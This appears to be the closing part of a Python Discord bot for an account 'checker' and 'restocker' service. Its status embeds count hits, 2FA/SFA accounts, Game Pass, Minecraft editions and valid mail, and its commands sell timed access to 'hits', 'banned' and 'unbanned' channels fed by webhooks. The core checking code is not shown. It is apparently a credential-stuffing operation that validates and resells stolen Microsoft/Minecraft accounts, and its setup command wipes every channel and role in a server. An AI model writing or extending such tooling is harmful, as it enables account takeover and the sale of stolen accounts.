        embed.add_field(name="🏰 Dungeons", value="0", inline=False)
        embed.add_field(name="📩 Valid Mail", value="0", inline=False)
        embed.add_field(name="🔄 Retries", value="0", inline=False)
        embed.add_field(name="⚠️ Errors", value="0", inline=False)
        embed.set_footer(text="Auto Restocker By SeriesV2 ⭐")
        await ctx.send(embed=embed)
        return

    session = list(checking_status.values())[0]

    embed = discord.Embed(
        title="🏢 Current Checker Status",
        color=0x00FFFF
    )

    embed.add_field(name="📁 Total/Checked", value=f"{session.checked}/{session.total}", inline=False)
    embed.add_field(name="✅ Hits", value=str(len(session.hits)), inline=False)
    embed.add_field(name="❌ Bad", value=str(len(session.invalid)), inline=False)
    embed.add_field(name="🔒 MFA", value=str(len(session.mfa_accounts)), inline=False)
    embed.add_field(name="🔐 2FA", value=str(len(session.two_fa_accounts)), inline=False)
    embed.add_field(name="🔒 SFA", value=str(len(session.sfa_accounts)), inline=False)
    embed.add_field(name="🎮 Xbox Gamepass", value=str(len(session.xboxgamepass)), inline=False)
    embed.add_field(name="⭐ Xbox Gamepass Ultimate", value=str(len(session.xboxgamepassultimate)), inline=False)
    embed.add_field(name="🎲 Bedrock", value=str(len(session.bedrock_accounts)), inline=False)
    embed.add_field(name="⚔️ Legends", value=str(len(session.legends_accounts)), inline=False)
    embed.add_field(name="🏰 Dungeons", value=str(len(session.dungeons_accounts)), inline=False)
    embed.add_field(name="📩 Valid Mail", value=str(len(session.valid_mails)), inline=False)
    embed.add_field(name="🔄 Retries", value=str(session.retries), inline=False)
    embed.add_field(name="⚠️ Errors", value=str(session.errors), inline=False)

    embed.set_footer(text="Auto Restocker By SeriesV2 ⭐")

    await ctx.send(embed=embed)

@bot.command()
async def stop(ctx):
    authed_users = load_authed_users()
    if ctx.author.id not in authed_users:
        embed = discord.Embed(title="Not Authorized", description=f"{ctx.author.mention} You are not authorized.", color=0x00FFFF)
        await ctx.send(embed=embed)
        return

    if not checking_status:
        embed = discord.Embed(title="No Active Session", description="No active checking session found.", color=0x00FFFF)
        await ctx.send(embed=embed)
        return

    session = list(checking_status.values())[0]
    session_user_id = list(checking_status.keys())[0]
    session.running = False

    await asyncio.sleep(1)
    await send_completion_summary(session)

    if session_user_id in checking_status:
        del checking_status[session_user_id]

    await ctx.send("Checker stopped and results sent!")

@bot.command()
async def setup(ctx):
    if ctx.author.id != ctx.guild.owner_id:
        await ctx.send("Only the server owner can use this command.")
        return

    setup_msg = await ctx.send("Setting up server structure...")

    try:
        try:
            await ctx.guild.edit(name="Ice Cloud Restockers")
        except:
            pass

        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                pass

        for role in ctx.guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    pass

        await asyncio.sleep(2)

        owner_role = await ctx.guild.create_role(name="Owner", permissions=discord.Permissions.all(), color=discord.Color.red(), hoist=True)
        authorized_role = await ctx.guild.create_role(name="Authorized Users", permissions=discord.Permissions.none(), color=discord.Color.green(), hoist=True)
        unauthorized_role = await ctx.guild.create_role(name="Unauthorized Users", permissions=discord.Permissions.none(), color=discord.Color.greyple(), hoist=True)
        bot_role = await ctx.guild.create_role(name="Main Bot", permissions=discord.Permissions.all(), color=discord.Color.purple(), hoist=True)

        await ctx.guild.owner.add_roles(owner_role)

        try:
            bot_member = ctx.guild.get_member(bot.user.id)
            if bot_member:
                await bot_member.add_roles(bot_role)
        except:
            pass

        paid_checker_category = await ctx.guild.create_category("Paid Checker", overwrites={
            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
            unauthorized_role: discord.PermissionOverwrite(read_messages=False),
            authorized_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            owner_role: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        })

        general_category = await ctx.guild.create_category("General", overwrites={
            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
            unauthorized_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            authorized_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            owner_role: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        })

        general_chat = await general_category.create_text_channel("general-chat")

        hits_channel = await paid_checker_category.create_text_channel("hits")
        commands_channel = await paid_checker_category.create_text_channel("commands")
        banned_channel = await paid_checker_category.create_text_channel("banned")
        unbanned_channel = await paid_checker_category.create_text_channel("unbanned")

        update_config('log_channel_id', hits_channel.id)

        try:
            banned_webhook = await banned_channel.create_webhook(name="Banned Hits")
            update_config('BannedWebhook', banned_webhook.url)
        except:
            pass

        try:
            unbanned_webhook = await unbanned_channel.create_webhook(name="Unbanned Hits")
            update_config('UnbannedWebhook', unbanned_webhook.url)
        except:
            pass

        global BANNED_WEBHOOK_URL, UNBANNED_WEBHOOK_URL, LOG_CHANNEL_ID
        config.read(config_file)
        BANNED_WEBHOOK_URL = config['SETTINGS'].get('BannedWebhook', '')
        UNBANNED_WEBHOOK_URL = config['SETTINGS'].get('UnbannedWebhook', '')
        LOG_CHANNEL_ID = int(config['SETTINGS']['log_channel_id'])

        embed = discord.Embed(title="Setup Complete", description="Server structure created!", color=0x00FFFF)
        embed.add_field(name="Log Channel", value=hits_channel.mention, inline=False)
        embed.add_field(name="General Chat", value=general_chat.mention, inline=False)
        await commands_channel.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def auth(ctx, member: discord.Member = None):
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("Only the bot owner can use this command.")
        return

    if member is None:
        await ctx.send("Please mention a user to authorize.")
        return

    authed_users = load_authed_users()

    if member.id in authed_users:
        await ctx.send(f"{member.mention} is already authorized.")
        return

    authed_users.append(member.id)
    save_authed_users(authed_users)

    try:
        authorized_role = discord.utils.get(ctx.guild.roles, name="Authorized Users")
        unauthorized_role = discord.utils.get(ctx.guild.roles, name="Unauthorized Users")
        if authorized_role:
            await member.add_roles(authorized_role)
        if unauthorized_role and unauthorized_role in member.roles:
            await member.remove_roles(unauthorized_role)
    except:
        pass

    embed = discord.Embed(title="User Authorized", description=f"{member.mention} has been authorized.", color=0x00FFFF)
    await ctx.send(embed=embed)

@bot.command()
async def unauth(ctx, member: discord.Member = None):
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("Only the bot owner can use this command.")
        return

    if member is None:
        await ctx.send("Please mention a user to unauthorize.")
        return

    authed_users = load_authed_users()

    if member.id not in authed_users:
        await ctx.send(f"{member.mention} is not authorized.")
        return

    authed_users.remove(member.id)
    save_authed_users(authed_users)

    try:
        authorized_role = discord.utils.get(ctx.guild.roles, name="Authorized Users")
        unauthorized_role = discord.utils.get(ctx.guild.roles, name="Unauthorized Users")
        if authorized_role and authorized_role in member.roles:
            await member.remove_roles(authorized_role)
        if unauthorized_role:
            await member.add_roles(unauthorized_role)
    except:
        pass

    embed = discord.Embed(title="User Unauthorized", description=f"{member.mention} access removed.", color=0x00FFFF)
    await ctx.send(embed=embed)

@bot.command()
async def listauth(ctx):
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("Only the bot owner can use this command.")
        return

    authed_users = load_authed_users()

    embed = discord.Embed(title="Authorized Users", color=0x00FFFF)

    if not authed_users:
        embed.description = "No authorized users."
    else:
        user_list = []
        for user_id in authed_users:
            user = bot.get_user(user_id)
            if user:
                user_list.append(f"{user.mention} - `{user_id}`")
            else:
                user_list.append(f"Unknown - `{user_id}`")
        embed.description = '\n'.join(user_list)

    embed.set_footer(text=f"Total: {len(authed_users)} users")
    await ctx.send(embed=embed)

@bot.command()
async def botstatus(ctx):
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("Only the bot owner can use this command.")
        return

    uptime_seconds = time.time() - start_time
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)

    embed = discord.Embed(title="Bot Status", color=0x00FFFF)
    embed.add_field(name="Uptime", value=f"{hours:02d}:{minutes:02d}:{seconds:02d}", inline=True)
    embed.add_field(name="Python", value=f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}", inline=True)

    await ctx.send(embed=embed)

@bot.command()
async def botaccess(ctx, access_level: int = None, member: discord.Member = None, duration: str = None):
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("Only the bot owner can use this command.")
        return

    if not access_level or not member or not duration:
        embed = discord.Embed(
            title="❌ Missing Arguments",
            description="Usage: `$botaccess <1|2|3> @user <duration>`\n\n**Access Levels:**\n1️⃣ - Banned channel only\n2️⃣ - Banned + Unbanned channels\n3️⃣ - Banned + Unbanned + Hits channels\n\n**Duration:** 1s, 1m, 1h, 1w, 1mo, lifetime",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return

    if access_level not in [1, 2, 3]:
        embed = discord.Embed(
            title="❌ Invalid Access Level",
            description="Please use 1, 2, or 3 for access level.",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return

    duration_seconds = None
    if duration.lower() == "lifetime":
        duration_seconds = None
    else:
        import re
        match = re.match(r'^(\d+)(s|m|h|w|mo)$', duration.lower())
        if not match:
            embed = discord.Embed(
                title="❌ Invalid Duration",
                description="Valid formats: 1s, 1m, 1h, 1w, 1mo, lifetime",
                color=0xFF0000
            )
            await ctx.send(embed=embed)
            return

        amount = int(match.group(1))
        unit = match.group(2)

        if unit == 's':
            duration_seconds = amount
        elif unit == 'm':
            duration_seconds = amount * 60
        elif unit == 'h':
            duration_seconds = amount * 3600
        elif unit == 'w':
            duration_seconds = amount * 604800
        elif unit == 'mo':
            duration_seconds = amount * 2592000

    try:
        banned_channel = discord.utils.get(ctx.guild.channels, name="banned")
        unbanned_channel = discord.utils.get(ctx.guild.channels, name="unbanned")
        hits_channel = discord.utils.get(ctx.guild.channels, name="hits")

        channels_to_grant = []

        if access_level >= 1 and banned_channel:
            channels_to_grant.append(banned_channel)

        if access_level >= 2 and unbanned_channel:
            channels_to_grant.append(unbanned_channel)

        if access_level >= 3:
            if hits_channel:
                channels_to_grant.append(hits_channel)

        for channel in channels_to_grant:
            await channel.set_permissions(member, read_messages=True, send_messages=True)

        channel_names = ", ".join([f"#{ch.name}" for ch in channels_to_grant])

        embed = discord.Embed(
            title="✅ Access Granted",
            description=f"{member.mention} has been granted access to: {channel_names}",
            color=0x00FF00
        )

        if duration_seconds:
            embed.add_field(name="Duration", value=duration, inline=False)
            await ctx.send(embed=embed)

            await asyncio.sleep(duration_seconds)

            for channel in channels_to_grant:
                await channel.set_permissions(member, overwrite=None)

            revoke_embed = discord.Embed(
                title="⏰ Access Expired",
                description=f"{member.mention}'s access to {channel_names} has expired.",
                color=0xFFA500
            )
            await ctx.send(embed=revoke_embed)
        else:
            embed.add_field(name="Duration", value="Lifetime", inline=False)
            await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Error",
            description=f"Failed to grant access: {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def create(ctx, channel_type: str = None):
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("Only the bot owner can use this command.")
        return

    if not channel_type:
        embed = discord.Embed(
            title="❌ Missing Argument",
            description="Usage: `$create <banned|unbanned>`",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return

    channel_type = channel_type.lower()

    if channel_type not in ['banned', 'unbanned']:
        embed = discord.Embed(
            title="❌ Invalid Type",
            description="Please use: `banned` or `unbanned`",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return

    try:
        paid_checker_category = discord.utils.get(ctx.guild.categories, name="Paid Checker")

        if not paid_checker_category:
            embed = discord.Embed(
                title="❌ Category Not Found",
                description="Please run `$setup` first to create the Paid Checker category.",
                color=0xFF0000
            )
            await ctx.send(embed=embed)
            return

        new_channel = await paid_checker_category.create_text_channel(channel_type)

        webhook = await new_channel.create_webhook(name="Ice Cloud Restocker")

        if channel_type == 'banned':
            update_config('BannedWebhook', webhook.url)
            global BANNED_WEBHOOK_URL
            BANNED_WEBHOOK_URL = webhook.url
        elif channel_type == 'unbanned':
            update_config('UnbannedWebhook', webhook.url)
            global UNBANNED_WEBHOOK_URL
            UNBANNED_WEBHOOK_URL = webhook.url

        embed = discord.Embed(
            title="✅ Channel and Webhook Created",
            description=f"Successfully created #{channel_type} channel and webhook.",
            color=0x00FF00
        )
        embed.add_field(name="Channel", value=new_channel.mention, inline=False)
        embed.add_field(name="Webhook", value=f"Ice Cloud Restocker", inline=False)
        embed.add_field(name="Config Updated", value=f"{channel_type.capitalize()}Webhook", inline=False)

        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Error",
            description=f"Failed to create channel/webhook: {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

bot.run(BOT_TOKEN)
